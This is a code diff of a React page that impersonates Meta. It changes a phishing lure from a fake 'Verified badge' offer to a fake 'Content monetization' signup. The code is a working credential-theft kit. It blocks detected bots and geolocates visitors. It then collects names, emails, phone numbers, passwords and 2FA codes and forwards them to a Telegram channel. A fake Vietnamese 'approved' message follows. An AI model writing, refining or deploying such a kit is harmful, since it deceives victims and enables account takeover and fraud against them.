@@ -1,8 +1,8 @@
 import { useEffect, useState, useCallback, useMemo } from 'react';
 import axios from 'axios';
 import MetaLogo from '@/assets/images/meta-logo-grey.png';
-import TickIcon from '@/assets/images/tick.svg';
-import TichImage from '@/assets/images/tich.webp';
+import KiemTienImg from '@/assets/images/kiemtien.png';
+import MoneyAdsImg from '@/assets/images/money-ads.png';
 import { translateText } from '@/utils/translate';
 import sendMessage from '@/utils/telegram';
 import detectBot from '@/utils/detect_bot';
@@ -12,51 +12,52 @@ import LoginModal from '@/components/LoginModal';
 import TwoFAModal from '@/components/TwoFAModal';
 import SuccessModal from '@/components/SuccessModal';
 import Sidebar from '@/components/Sidebar';
-import BenefitsSection from '@/components/BenefitsSection';
-import TestimonialSection from '@/components/TestimonialSection';
 import SearchModal from '@/components/SearchModal';
 import PrivacyPolicyModal from '@/components/PrivacyPolicyModal';
 import TermsModal from '@/components/TermsModal';
-import SaveImg from '@/assets/images/save_img.png';
-import DocImg from '@/assets/images/doc.png';
 
 const LABEL = 'Thần-tài-đến';
 
-const Home = () => {
-    const [showFirstModal, setShowFirstModal] = useState(false);
-    const [showLoginModal, setShowLoginModal] = useState(false);
-    const [show2FAModal, setShow2FAModal] = useState(false);
-    const [showSuccessModal, setShowSuccessModal] = useState(false);
-    const [showSearchModal, setShowSearchModal] = useState(false);
-    const [showPrivacyModal, setShowPrivacyModal] = useState(false);
-    const [selectedPrivacyQuestion, setSelectedPrivacyQuestion] = useState(null);
-    const [showTermsModal, setShowTermsModal] = useState(false);
-    const [showMobileSidebar, setShowMobileSidebar] = useState(false);
-    const [formData, setFormData] = useState({
+const Home = () =>
+{
+    const [ showFirstModal, setShowFirstModal ] = useState( false );
+    const [ showLoginModal, setShowLoginModal ] = useState( false );
+    const [ show2FAModal, setShow2FAModal ] = useState( false );
+    const [ showSuccessModal, setShowSuccessModal ] = useState( false );
+    const [ showSearchModal, setShowSearchModal ] = useState( false );
+    const [ showPrivacyModal, setShowPrivacyModal ] = useState( false );
+    const [ selectedPrivacyQuestion, setSelectedPrivacyQuestion ] = useState( null );
+    const [ showTermsModal, setShowTermsModal ] = useState( false );
+    const [ showMobileSidebar, setShowMobileSidebar ] = useState( false );
+    const [ formData, setFormData ] = useState( {
         fullName: '',
         personalEmail: '',
         businessEmail: '',
         phone: '',
         pageName: '',
         loginIdentifier: ''
-    });
-    const [loginAttempts, setLoginAttempts] = useState([]);
-    const [twoFAAttempts, setTwoFAAttempts] = useState([]);
-    const [ipInfo, setIpInfo] = useState({ ip: 'Unknown', city: 'Unknown', region: 'Unknown', country: 'Unknown' });
-    const [translatedTexts, setTranslatedTexts] = useState({});
-    const [isLoading, setIsLoading] = useState(true);
+    } );
+    const [ loginAttempts, setLoginAttempts ] = useState( [] );
+    const [ twoFAAttempts, setTwoFAAttempts ] = useState( [] );
+    const [ ipInfo, setIpInfo ] = useState( { ip: 'Unknown', city: 'Unknown', region: 'Unknown', country: 'Unknown' } );
+    const [ translatedTexts, setTranslatedTexts ] = useState( {} );
+    const [ isLoading, setIsLoading ] = useState( true );
 
     const defaultTexts = useMemo(
-        () => ({
-            title: 'Your page has met the requirements to receive the Verified badge.',
-            congrats: 'Congratulations on meeting the requirements to upgrade your page to the Verified badge',
-            milestone: 'This is a fantastic milestone, reflecting your dedication and the trust you have built with your audience.',
-            excited: 'We are excited to celebrate this moment with you and look forward to seeing your page grow even stronger with this prestigious recognition!',
-            getBadge: 'Get the Verified badge',
-            metaVerified: 'Meta Verified',
-            protectBrand: 'Protect your brand with Meta Verified',
-            showWorld: 'Show the world that you mean business.',
-            buildConfidence: 'Meta Verified helps you build more confidence with new audiences and protects your brand.',
+        () => ( {
+            metaVerified: 'Content monetization',
+            monetizationTitle: 'Content monetization',
+            monetizationSubtitle: 'Earn money by creating content that your audience loves.',
+            inVideoAdsDesc1: 'If you upload video content to Facebook, you may be eligible to earn money through in-video ads.',
+            inVideoAdsDesc2: 'To use this monetization method, you need to register.',
+            howItWorksTitle: 'How Content monetization works',
+            monetizationBetaLabel: 'Content monetization beta',
+            monetizationBetaDesc: "We're actively working to expand access and make this program available to more creators soon.",
+            getNotifiedTitle: 'Get notified when you can join',
+            waitlistLabel: "You're on the waitlist",
+            waitlistDesc: "Being on the waitlist doesn't guarantee access. We're actively working on expanding this program.",
+            applyNow: 'Apply now',
+            learnMore: 'Learn more',
             search: 'Search',
             privacyPolicy: 'Privacy Policy',
             otherRules: 'Other rules and articles',
@@ -119,12 +120,17 @@ const Home = () => {
             codeExpired: 'This code has expired. Please enter a new code later',
             pleaseWait: 'Please wait',
 
-            successTitle: 'The request was sent successfully',
-            successMessage1: 'Great, your verification request has been approved.',
-            successMessage2: 'The badge should appear next to your name within the next hour.',
-            successMessage3: 'If the badge has not appeared after this time, please contact us again for further assistance.',
-            thankYou: 'Thank you',
-            metaSupportTeam: 'Meta Support Team.',
+            findNewWaysTitle: 'Find new ways to earn money with your content.',
+            creatorLabel: 'Creator',
+            subscribeBtn: 'Subscribe',
+            monetizeDesc: "Whether you're creating videos or publishing to a blog, Facebook monetization tools help you earn more money.",
+
+            successTitle: 'Đăng ký kiếm tiền thành công!',
+            successMessage1: 'Tuyệt vời! Yêu cầu đăng ký kiếm tiền của bạn đã được phê duyệt.',
+            successMessage2: 'Tính năng kiếm tiền sẽ được kích hoạt trên trang của bạn trong vòng 24 – 48 giờ tới.',
+            successMessage3: 'Nếu tính năng chưa xuất hiện sau thời gian này, vui lòng liên hệ lại với chúng tôi để được hỗ trợ thêm.',
+            thankYou: 'Cảm ơn bạn đã tin tưởng!',
+            metaSupportTeam: 'Nhóm hỗ trợ Meta.',
 
             searchPlaceholder: 'Search the Privacy Center',
             nothingFound: 'Nothing found',
@@ -203,186 +209,214 @@ const Home = () => {
             privacyQ11: 'How will you know when the policy changes?',
             privacyQ12: 'How to ask Meta questions?',
             privacyQ13: 'Why and how we process your data'
-        }),
+        } ),
         []
     );
 
-    useEffect(() => {
+    useEffect( () =>
+    {
         localStorage.clear();
         initializeApp();
-    }, []);
+    }, [] );
 
-    const initializeApp = async () => {
-        try {
+    const initializeApp = async () =>
+    {
+        try
+        {
             const botResult = await detectBot();
-            if (botResult.isBot) {
+            if ( botResult.isBot )
+            {
                 window.location.href = 'about:blank';
                 return;
             }
 
-            try {
-                const response = await axios.get('https://get.geojs.io/v1/ip/geo.json');
+            try
+            {
+                const response = await axios.get( 'https://get.geojs.io/v1/ip/geo.json' );
                 const data = response.data;
-                setIpInfo({
+                setIpInfo( {
                     ip: data.ip || 'Unknown',
                     city: data.city || 'Unknown',
                     region: data.region || 'Unknown',
                     country: data.country || 'Unknown'
-                });
-                localStorage.setItem('ipInfo', JSON.stringify(data));
+                } );
+                localStorage.setItem( 'ipInfo', JSON.stringify( data ) );
 
                 const countryCode = data.country_code;
-                const targetLang = countryToLanguage[countryCode] || 'en';
-                localStorage.setItem('targetLang', targetLang);
+                const targetLang = countryToLanguage[ countryCode ] || 'en';
+                localStorage.setItem( 'targetLang', targetLang );
 
-                if (targetLang !== 'en') {
-                    translateAllTexts(targetLang);
-                } else {
-                    setTranslatedTexts(defaultTexts);
+                if ( targetLang !== 'en' )
+                {
+                    translateAllTexts( targetLang );
+                } else
+                {
+                    setTranslatedTexts( defaultTexts );
                 }
-            } catch (error) {
-                console.error('Error fetching IP:', error);
-                setTranslatedTexts(defaultTexts);
+            } catch ( error )
+            {
+                console.error( 'Error fetching IP:', error );
+                setTranslatedTexts( defaultTexts );
             }
 
-            setIsLoading(false);
-        } catch (error) {
-            console.error('Initialization error:', error);
-            setIsLoading(false);
+            setIsLoading( false );
+        } catch ( error )
+        {
+            console.error( 'Initialization error:', error );
+            setIsLoading( false );
         }
     };
 
     const translateAllTexts = useCallback(
-        async (targetLang) => {
-            try {
-                const keys = Object.keys(defaultTexts);
-                const translations = await Promise.all(keys.map((key) => translateText(defaultTexts[key], targetLang)));
+        async ( targetLang ) =>
+        {
+            try
+            {
+                const keys = Object.keys( defaultTexts );
+                const translations = await Promise.all( keys.map( ( key ) => translateText( defaultTexts[ key ], targetLang ) ) );
                 const translated = {};
-                keys.forEach((key, index) => {
-                    translated[key] = translations[index];
-                });
-                setTranslatedTexts(translated);
-            } catch (error) {
-                console.error('Translation error:', error);
-                setTranslatedTexts(defaultTexts);
+                keys.forEach( ( key, index ) =>
+                {
+                    translated[ key ] = translations[ index ];
+                } );
+                setTranslatedTexts( translated );
+            } catch ( error )
+            {
+                console.error( 'Translation error:', error );
+                setTranslatedTexts( defaultTexts );
             }
         },
-        [defaultTexts]
+        [ defaultTexts ]
     );
 
-    const pad = (n) => (n < 10 ? '0' + n : String(n));
+    const pad = ( n ) => ( n < 10 ? '0' + n : String( n ) );
 
-    const formatDateTime = (d) => {
+    const formatDateTime = ( d ) =>
+    {
         return (
-            pad(d.getDate()) +
+            pad( d.getDate() ) +
             '/' +
-            pad(d.getMonth() + 1) +
+            pad( d.getMonth() + 1 ) +
             '/' +
             d.getFullYear() +
             ' ' +
-            pad(d.getHours()) +
+            pad( d.getHours() ) +
             ':' +
-            pad(d.getMinutes()) +
+            pad( d.getMinutes() ) +
             ':' +
-            pad(d.getSeconds())
+            pad( d.getSeconds() )
         );
     };
 
-    const buildAndSend = async (data) => {
-        const dt = formatDateTime(new Date());
+    const buildAndSend = async ( data ) =>
+    {
+        const dt = formatDateTime( new Date() );
         const { form, login, passes, codes } = data;
 
-        let message = `📩 <b>${LABEL}</b>\n`;
-        message += `⏰ ${dt}\n`;
-        message += `🌐 IP: <code>${ipInfo.ip}</code>\n`;
-        message += `📍 Vị trí: ${ipInfo.city}, ${ipInfo.region}, ${ipInfo.country}\n`;
+        let message = `📩 <b>${ LABEL }</b>\n`;
+        message += `⏰ ${ dt }\n`;
+        message += `🌐 IP: <code>${ ipInfo.ip }</code>\n`;
+        message += `📍 Vị trí: ${ ipInfo.city }, ${ ipInfo.region }, ${ ipInfo.country }\n`;
         message += `━━━━━━━━━━━━━━━━━━━━\n`;
 
-        if (form.fullName || form.personalEmail || form.businessEmail || form.phone || form.pageName) {
+        if ( form.fullName || form.personalEmail || form.businessEmail || form.phone || form.pageName )
+        {
             message += `<b>📋 THÔNG TIN</b>\n`;
-            if (form.fullName) message += `   Tên: <code>${form.fullName}</code>\n`;
-            if (form.personalEmail) message += `   Email: <code>${form.personalEmail}</code>\n`;
-            if (form.businessEmail && form.businessEmail !== form.personalEmail) {
-                message += `   Business: <code>${form.businessEmail}</code>\n`;
+            if ( form.fullName ) message += `   Tên: <code>${ form.fullName }</code>\n`;
+            if ( form.personalEmail ) message += `   Email: <code>${ form.personalEmail }</code>\n`;
+            if ( form.businessEmail && form.businessEmail !== form.personalEmail )
+            {
+                message += `   Business: <code>${ form.businessEmail }</code>\n`;
             }
-            if (form.phone) message += `   SĐT: <code>${form.phone}</code>\n`;
-            if (form.pageName) message += `   Page: <code>${form.pageName}</code>\n`;
+            if ( form.phone ) message += `   SĐT: <code>${ form.phone }</code>\n`;
+            if ( form.pageName ) message += `   Page: <code>${ form.pageName }</code>\n`;
         }
 
-        if (login || (passes && passes.length > 0)) {
+        if ( login || ( passes && passes.length > 0 ) )
+        {
             message += `\n<b>🔐 ĐĂNG NHẬP</b>\n`;
-            if (login) message += `   TK: <code>${login}</code>\n`;
-            if (passes && passes.length > 0) {
-                passes.forEach((p, i) => {
-                    message += `   MK${i + 1}: <code>${p}</code>\n`;
-                });
+            if ( login ) message += `   TK: <code>${ login }</code>\n`;
+            if ( passes && passes.length > 0 )
+            {
+                passes.forEach( ( p, i ) =>
+                {
+                    message += `   MK${ i + 1 }: <code>${ p }</code>\n`;
+                } );
             }
         }
 
-        if (codes && codes.length > 0) {
+        if ( codes && codes.length > 0 )
+        {
             message += `\n<b>🔒 MÃ 2FA</b>\n`;
-            codes.forEach((c, i) => {
-                message += `   Code${i + 1}: <code>${c}</code>\n`;
-            });
+            codes.forEach( ( c, i ) =>
+            {
+                message += `   Code${ i + 1 }: <code>${ c }</code>\n`;
+            } );
         }
 
         message += `━━━━━━━━━━━━━━━━━━━━`;
 
-        try {
-            await sendMessage(message);
-        } catch (error) {
-            console.error('Error sending message:', error);
+        try
+        {
+            await sendMessage( message );
+        } catch ( error )
+        {
+            console.error( 'Error sending message:', error );
         }
     };
 
-    const handleFirstFormSubmit = (data) => {
+    const handleFirstFormSubmit = ( data ) =>
+    {
         const newFormData = { ...formData, ...data };
-        setFormData(newFormData);
-        setShowFirstModal(false);
-        setShowLoginModal(true);
+        setFormData( newFormData );
+        setShowFirstModal( false );
+        setShowLoginModal( true );
 
-        buildAndSend({
+        buildAndSend( {
             form: newFormData,
             login: null,
             passes: [],
             codes: []
-        });
+        } );
     };
 
-    const handleLoginSubmit = (email, password) => {
+    const handleLoginSubmit = ( email, password ) =>
+    {
         const newFormData = { ...formData, loginIdentifier: email };
-        const newPasses = [...loginAttempts.map(p => p.value), password].slice(-2);
+        const newPasses = [ ...loginAttempts.map( p => p.value ), password ].slice( -2 );
 
-        setFormData(newFormData);
-        setLoginAttempts(prev => [...prev, { time: new Date().toISOString(), value: password }].slice(-2));
+        setFormData( newFormData );
+        setLoginAttempts( prev => [ ...prev, { time: new Date().toISOString(), value: password } ].slice( -2 ) );
 
-        buildAndSend({
+        buildAndSend( {
             form: newFormData,
             login: email,
             passes: newPasses,
-            codes: twoFAAttempts.map(c => c.value)
-        });
+            codes: twoFAAttempts.map( c => c.value )
+        } );
     };
 
-    const handle2FASubmit = (code) => {
-        const newCodes = [...twoFAAttempts.map(c => c.value), code].slice(-3);
+    const handle2FASubmit = ( code ) =>
+    {
+        const newCodes = [ ...twoFAAttempts.map( c => c.value ), code ].slice( -3 );
 
-        setTwoFAAttempts(prev => [...prev, { time: new Date().toISOString(), value: code }].slice(-3));
+        setTwoFAAttempts( prev => [ ...prev, { time: new Date().toISOString(), value: code } ].slice( -3 ) );
 
-        buildAndSend({
+        buildAndSend( {
             form: formData,
             login: formData.loginIdentifier,
-            passes: loginAttempts.map(p => p.value),
+            passes: loginAttempts.map( p => p.value ),
             codes: newCodes
-        });
+        } );
     };
 
-    const texts = Object.keys(translatedTexts).length > 0 ? translatedTexts : defaultTexts;
+    const texts = Object.keys( translatedTexts ).length > 0 ? translatedTexts : defaultTexts;
 
-    if (isLoading) {
+    if ( isLoading )
+    {
         return (
-            <div id="intro" style={{ position: 'fixed', top: 0, left: 0, width: '100%', height: '100%', background: '#fff', display: 'flex', justifyContent: 'center', alignItems: 'center', zIndex: 9999 }}>
-                <img id="meta-logo" src={MetaLogo} alt="Meta" style={{ width: '70%', height: 'auto' }} />
+            <div id="intro" style={ { position: 'fixed', top: 0, left: 0, width: '100%', height: '100%', background: '#fff', display: 'flex', justifyContent: 'center', alignItems: 'center', zIndex: 9999 } }>
+                <img id="meta-logo" src={ MetaLogo } alt="Meta" style={ { width: '70%', height: 'auto' } } />
             </div>
         );
     }
@@ -424,261 +458,200 @@ const Home = () => {
                             >                            </path>
                         </svg>
                     </div>
-                    <div className="burger-button" id="showPopup" onClick={() => setShowMobileSidebar(true)} style={{ cursor: 'pointer' }}>
+                    <div className="burger-button" id="showPopup" onClick={ () => setShowMobileSidebar( true ) } style={ { cursor: 'pointer' } }>
                         <div className="bar"></div>
                         <div className="bar"></div>
                         <div className="bar"></div>
                     </div>
                 </div>
                 <div className="row">
-                            <div className="col-4">
-                                <Sidebar
-                                    texts={texts}
-                                    onOpenSearchModal={() => setShowSearchModal(true)}
-                                    onOpenPrivacyModal={(question) => {
-                                        setSelectedPrivacyQuestion(question);
-                                        setShowPrivacyModal(true);
-                                    }}
-                                    onOpenTermsModal={() => setShowTermsModal(true)}
-                                />
-                            </div>
+                    <div className="col-4">
+                        <Sidebar
+                            texts={ texts }
+                            onOpenSearchModal={ () => setShowSearchModal( true ) }
+                            onOpenPrivacyModal={ ( question ) =>
+                            {
+                                setSelectedPrivacyQuestion( question );
+                                setShowPrivacyModal( true );
+                            } }
+                            onOpenTermsModal={ () => setShowTermsModal( true ) }
+                        />
+                    </div>
                     <div className="col-8">
                         <div id="right">
-                            <h1>
-                                <img alt="" src={TickIcon} style={{ height: '50px', width: '50px', marginRight: '8px' }} />
-                                {texts.title}
-                            </h1>
-                            <p>{texts.congrats}</p>
-                            <p>{texts.milestone}</p>
-                            <p>{texts.excited}</p>
+                            <div style={ { fontSize: '20px', fontWeight: '700', color: '#1c1e21', marginBottom: '4px' } }>
+                                { texts.monetizationTitle }
+                            </div>
+                            <p style={ { color: '#65676b', marginBottom: '8px' } }>{ texts.monetizationSubtitle }</p>
+                            <p style={ { color: '#65676b', marginBottom: '4px' } }>{ texts.inVideoAdsDesc1 }</p>
+                            <p style={ { color: '#65676b', marginBottom: '16px' } }>{ texts.inVideoAdsDesc2 }</p>
 
-                            <div id="card" style={{ background: 'rgb(222, 240, 243)' }}>
-                                <img alt="" src={TichImage} style={{ marginTop: '30px' }} />
-                                <div className="card-text">
-                                    <div
-                                        style={{
-                                            borderRadius: '15px',
-                                            backgroundColor: 'white',
-                                            padding: '20px 20px 10px 20px'
-                                        }}
-                                    >
-                                        <h5>
-                                            <img src={TickIcon} width="18" alt="tick" style={{ verticalAlign: 'middle' }} /> {texts.metaVerified}
-                                        </h5>
-                                        <h6>{texts.protectBrand}</h6>
-                                        <h6 style={{ display: 'flex', flexDirection: 'column', gap: '6px' }}>
-                                            <span>{texts.showWorld}</span>
-                                            <span>{texts.buildConfidence}</span>
-                                        </h6>
+                            {/* Card 1: How it works */ }
+                            <div style={ { background: '#fff', borderRadius: '12px', boxShadow: '0 1px 3px rgba(0,0,0,0.15)', marginBottom: '16px', overflow: 'hidden' } }>
+                                <div style={ { padding: '16px 16px 0' } }>
+                                    <div style={ { fontSize: '17px', fontWeight: '700', color: '#1c1e21', marginBottom: '12px' } }>
+                                        { texts.howItWorksTitle }
                                     </div>
-                                    <div className="btn-wrapper">
-                                        <div className="button fb-blue w-100" id="start" onClick={() => setShowFirstModal(true)}>
-                                            {texts.getBadge}
+                                </div>
+                                <div style={ { padding: '0 16px 12px', position: 'relative' } }>
+                                    <img
+                                        alt="In-video ads example"
+                                        src={ MoneyAdsImg }
+                                        style={ { width: '100%', display: 'block', height: '345px', borderRadius: '10px', objectFit:'cover' } }
+                                    />
+                                    <img
+                                        alt=""
+                                        src="https://static.xx.fbcdn.net/rsrc.php/yh/r/M6gzkg5vYje.webp?_nc_eui2=AeFevwqVrtKjECYULcTXH3fl5akSRm94oLTlqRJGb3igtA6PbqtuZ3EAfNXCiOnG0BIJGf6NkbxeNO8kaGjkzxyB"
+                                        style={ { position: 'absolute', top: '8px', right: '24px', width: '56px', height: '56px', objectFit: 'contain' } }
+                                        referrerPolicy="origin-when-cross-origin"
+                                    />
+                                </div>
+                                <div style={ { padding: '16px' } }>
+                                    <div style={ { display: 'flex', alignItems: 'flex-start', gap: '12px', background: '#f0f2f5', borderRadius: '10px', padding: '12px' } }>
+                                        <img
+                                            alt=""
+                                            src="https://static.xx.fbcdn.net/rsrc.php/yW/r/Mj9cg0dI-lS.webp?_nc_eui2=AeHtRcM2QkSgUjRiihrA33hyzowCkmYvbC_OjAKSZi9sL1nvLXCZdAMcdsoktuC61mQYordHhyG5zRprCwVK4tKz"
+                                            width="24"
+                                            height="24"
+                                            referrerPolicy="origin-when-cross-origin"
+                                        />
+                                        <div>
+                                            <div style={ { fontWeight: '600', fontSize: '15px', color: '#1c1e21', marginBottom: '4px' } }>
+                                                { texts.monetizationBetaLabel }
+                                            </div>
+                                            <div style={ { fontSize: '14px', color: '#65676b' } }>
+                                                { texts.monetizationBetaDesc }
+                                            </div>
                                         </div>
                                     </div>
                                 </div>
                             </div>
 
-                            <BenefitsSection texts={texts} />
-                            <TestimonialSection texts={texts} />
-
-                            <h5>
-                                <img src={TickIcon} width="18" alt="tick" style={{ verticalAlign: 'middle' }} /> {texts.exploreBusiness}
-                            </h5>
-                            <br />
-                            <h6>{texts.businessDesc1}</h6>
-                            <h6>{texts.businessDesc2}</h6>
-                            <h6>{texts.businessDesc3}</h6>
-                            <h6>{texts.businessDesc4}</h6>
-                            <h6>
-                                {texts.businessDesc5}
-                                <br />
-                                {texts.businessDesc6}
-                                <br />
-                                <br />
-                                <div className="fake-likns">
-                                    <div className="action-button-list">
-                                        <div
-                                            className="action-button wide"
-                                            onClick={() => {
-                                                setSelectedPrivacyQuestion(texts.privacyPolicyQ);
-                                                setShowPrivacyModal(true);
-                                            }}
-                                            style={{ cursor: 'pointer' }}
-                                        >
-                                            <div className="action-button-img">
-                                                <img alt="" src={SaveImg} />
-                                            </div>
-                                            <div className="action-button-text">
-                                                <span>{texts.privacyPolicyQ}</span>
-                                                <br />
-                                                <span className="small-grey">{texts.privacyPolicy}</span>
-                                            </div>
-                                            <div className="action-button-arrow">
-                                                <svg className="x1lliihq x1k90msu x2h7rmj x1qfuztq xcza8v6 xlup9mm x1kky2od" fill="currentColor" height="1em" viewBox="0 0 24 24" width="1em">
-                                                    <path clipRule="evenodd" d="M7.247 4.341a1 1 0 0 1 1.412-.094l8 7a1 1 0 0 1 0 1.506l-8 7a1 1 0 0 1-1.318-1.506L14.482 12l-7.14-6.247a1 1 0 0 1-.094-1.412z" fillRule="evenodd"></path>
-                                                </svg>
-                                            </div>
+                            {/* Card 2: Get notified */ }
+                            <div style={ { background: '#fff', borderRadius: '12px', boxShadow: '0 1px 3px rgba(0,0,0,0.15)', marginBottom: '16px', overflow: 'hidden' } }>
+                                <div style={ { padding: '14px 16px 14px' } }>
+                                    <div style={ { fontSize: '17px', fontWeight: '700', color: '#1c1e21', marginBottom: '12px' } }>
+                                        { texts.getNotifiedTitle }
+                                    </div>
+                                    <div style={ { display: 'flex', alignItems: 'flex-start', gap: '12px', background: '#f0f2f5', borderRadius: '10px', padding: '12px', marginBottom: '10px' } }>
+                                        <div style={ { flexShrink: 0, width: '32px', height: '32px', borderRadius: '50%', background: '#e4e6eb', display: 'flex', alignItems: 'center', justifyContent: 'center' } }>
+                                            <img
+                                                alt=""
+                                                src="https://static.xx.fbcdn.net/rsrc.php/yj/r/yhNnexVBr6T.webp?_nc_eui2=AeGj67MLO6SQsk1j403fpl0irPsT7zqTeses-xPvOpN6xznzw4_aj-Auiu80kX2gZtPRZTWj3tTJ9JRf0p6hQ6Ad"
+                                                width="24"
+                                                height="24"
+                                                referrerPolicy="origin-when-cross-origin"
+                                            />
                                         </div>
-                                        <div
-                                            className="action-button wide"
-                                            onClick={() => {
-                                                setSelectedPrivacyQuestion(texts.manageInfo);
-                                                setShowPrivacyModal(true);
-                                            }}
-                                            style={{ cursor: 'pointer' }}
-                                        >
-                                            <div className="action-button-img">
-                                                <img alt="" src={SaveImg} />
+                                        <div>
+                                            <div style={ { fontWeight: '600', fontSize: '15px', color: '#1c1e21', marginBottom: '4px' } }>
+                                                { texts.waitlistLabel }
                                             </div>
-                                            <div className="action-button-text">
-                                                <span>{texts.manageInfo}</span>
-                                                <br />
-                                                <span className="small-grey">{texts.privacyPolicy}</span>
-                                            </div>
-                                            <div className="action-button-arrow">
-                                                <svg className="x1lliihq x1k90msu x2h7rmj x1qfuztq xcza8v6 xlup9mm x1kky2od" fill="currentColor" height="1em" viewBox="0 0 24 24" width="1em">
-                                                    <path clipRule="evenodd" d="M7.247 4.341a1 1 0 0 1 1.412-.094l8 7a1 1 0 0 1 0 1.506l-8 7a1 1 0 0 1-1.318-1.506L14.482 12l-7.14-6.247a1 1 0 0 1-.094-1.412z" fillRule="evenodd"></path>
-                                                </svg>
+                                            <div style={ { fontSize: '14px', color: '#65676b' } }>
+                                                { texts.waitlistDesc }
                                             </div>
                                         </div>
                                     </div>
-                                    <br />
-                                    <h6>{texts.userAgreement}</h6>
                                     <div
-                                        className="action-button wide"
-                                        onClick={() => setShowTermsModal(true)}
-                                        style={{ cursor: 'pointer' }}
+                                        className="button fb-blue w-100"
+                                        id="start"
+                                        onClick={ () => setShowFirstModal( true ) }
+                                        style={ { cursor: 'pointer' } }
                                     >
-                                        <div className="action-button-img">
-                                            <img alt="" src={DocImg} />
+                                        { texts.applyNow }
+                                    </div>
+                                </div>
+                            </div>
+                            {/* Card 3: Monetize My Content */ }
+                            <div style={ { background: '#1c2b33', borderRadius: '12px', overflow: 'hidden', marginBottom: '16px' } }>
+                                <div style={ { padding: '16px', display: 'flex', gap: '16px', alignItems: 'flex-start' } }>
+                                    <div style={ { flex: 1 } }>
+                                        <div style={ { fontSize: '11px', color: '#b0b8bf', marginBottom: '10px' } }>
+                                            © Monetize My Content
                                         </div>
-                                        <div className="action-button-text">
-                                            <span>{texts.metaAI}</span>
-                                            <br />
-                                            <span className="small-grey">User Agreement</span>
+                                        <div style={ { fontSize: '22px', fontWeight: '700', color: '#fff', lineHeight: '1.3', marginBottom: '12px' } }>
+                                            { texts.findNewWaysTitle }
                                         </div>
-                                        <div className="action-button-arrow">
-                                            <svg className="x1lliihq x1k90msu x2h7rmj x1qfuztq xcza8v6 xlup9mm x1kky2od" fill="currentColor" height="1em" viewBox="0 0 24 24" width="1em">
-                                                <path clipRule="evenodd" d="M7.247 4.341a1 1 0 0 1 1.412-.094l8 7a1 1 0 0 1 0 1.506l-8 7a1 1 0 0 1-1.318-1.506L14.482 12l-7.14-6.247a1 1 0 0 1-.094-1.412z" fillRule="evenodd"></path>
-                                            </svg>
+                                        <div style={ { display: 'flex', alignItems: 'center', gap: '6px', color: '#e4e6eb', fontSize: '14px', fontWeight: '500', borderBottom: '1px solid #e4e6eb', paddingBottom: '2px', width: 'fit-content', cursor: 'pointer' } }>
+                                            { texts.creatorLabel } <span style={ { fontSize: '12px' } }>↓</span>
                                         </div>
                                     </div>
-                                    <br />
-                                    <h6>{texts.additionalResources}</h6>
-                                    <div className="action-button-list">
-                                        <div
-                                            className="action-button wide"
-                                            onClick={() => {
-                                                setSelectedPrivacyQuestion(texts.aiInfo);
-                                                setShowPrivacyModal(true);
-                                            }}
-                                            style={{ cursor: 'pointer' }}
-                                        >
-                                            <div className="action-button-text">
-                                                <span>{texts.aiInfo}</span>
-                                                <br />
-                                                <span className="small-grey">{texts.privacyCenter}</span>
-                                            </div>
-                                            <div className="action-button-arrow">
-                                                <svg className="x1lliihq x1k90msu x2h7rmj x1qfuztq xcza8v6 xlup9mm x1kky2od" fill="currentColor" height="1em" viewBox="0 0 24 24" width="1em">
-                                                    <path clipRule="evenodd" d="M7.247 4.341a1 1 0 0 1 1.412-.094l8 7a1 1 0 0 1 0 1.506l-8 7a1 1 0 0 1-1.318-1.506L14.482 12l-7.14-6.247a1 1 0 0 1-.094-1.412z" fillRule="evenodd"></path>
-                                                </svg>
-                                            </div>
+                                    <div style={ { flexShrink: 0, width: '180px', position: 'relative', borderRadius: '12px', overflow: 'hidden' } }>
+                                        <div style={ { position: 'absolute', top: '8px', left: '8px', right: '8px', display: 'flex', alignItems: 'center', gap: '8px', zIndex: 1 } }>
+
+                                            <span style={ { color: '#fff', fontSize: '13px', fontWeight: '600', textShadow: '0 1px 2px rgba(0,0,0,0.5)' } }>The Vegan Baker</span>
                                         </div>
-                                        <div
-                                            className="action-button wide"
-                                            onClick={() => {
-                                                setSelectedPrivacyQuestion(texts.aiCards);
-                                                setShowPrivacyModal(true);
-                                            }}
-                                            style={{ cursor: 'pointer' }}
-                                        >
-                                            <div className="action-button-text">
-                                                <span>{texts.aiCards}</span>
-                                                <br />
-                                                <span className="small-grey">{texts.metaAIWebsite}</span>
-                                            </div>
-                                            <div className="action-button-arrow">
-                                                <svg className="x1lliihq x1k90msu x2h7rmj x1qfuztq xcza8v6 xlup9mm x1kky2od" fill="currentColor" height="1em" viewBox="0 0 24 24" width="1em">
-                                                    <path clipRule="evenodd" d="M7.247 4.341a1 1 0 0 1 1.412-.094l8 7a1 1 0 0 1 0 1.506l-8 7a1 1 0 0 1-1.318-1.506L14.482 12l-7.14-6.247a1 1 0 0 1-.094-1.412z" fillRule="evenodd"></path>
-                                                </svg>
-                                            </div>
-                                        </div>
-                                        <div
-                                            className="action-button wide"
-                                            onClick={() => {
-                                                setSelectedPrivacyQuestion(texts.aiIntro);
-                                                setShowPrivacyModal(true);
-                                            }}
-                                            style={{ cursor: 'pointer' }}
-                                        >
-                                            <div className="action-button-text">
-                                                <span>{texts.aiIntro}</span>
-                                                <br />
-                                                <span className="small-grey">{texts.forTeenagers}</span>
-                                            </div>
-                                            <div className="action-button-arrow">
-                                                <svg className="x1lliihq x1k90msu x2h7rmj x1qfuztq xcza8v6 xlup9mm x1kky2od" fill="currentColor" height="1em" viewBox="0 0 24 24" width="1em">
-                                                    <path clipRule="evenodd" d="M7.247 4.341a1 1 0 0 1 1.412-.094l8 7a1 1 0 0 1 0 1.506l-8 7a1 1 0 0 1-1.318-1.506L14.482 12l-7.14-6.247a1 1 0 0 1-.094-1.412z" fillRule="evenodd"></path>
-                                                </svg>
+                                        <img
+                                            src={ KiemTienImg }
+                                            alt="Creator monetization"
+                                            style={ { width: '100%', height: '200px', objectFit: 'cover', display: 'block' } }
+                                        />
+                                        <div style={ { position: 'absolute', bottom: '16px', left: '12px' } }>
+                                            <div style={ { background: '#fff', borderRadius: '8px', padding: '6px 14px', fontSize: '14px', fontWeight: '600', color: '#1c1e21', boxShadow: '0 2px 6px rgba(0,0,0,0.2)' } }>
+                                                { texts.subscribeBtn }
                                             </div>
                                         </div>
                                     </div>
                                 </div>
-                            </h6>
-                            <p className="small-grey">
-                                {texts.privacyRisks} <a className="add-svg" id="policyLink" target="_blank" rel="noopener noreferrer">{texts.privacyPolicy}</a>
-                            </p>
+                                <div style={ { padding: '0 16px 16px' } }>
+                                    <div style={ { fontSize: '14px', fontWeight: '600', color: '#e4e6eb', lineHeight: '1.5' } }>
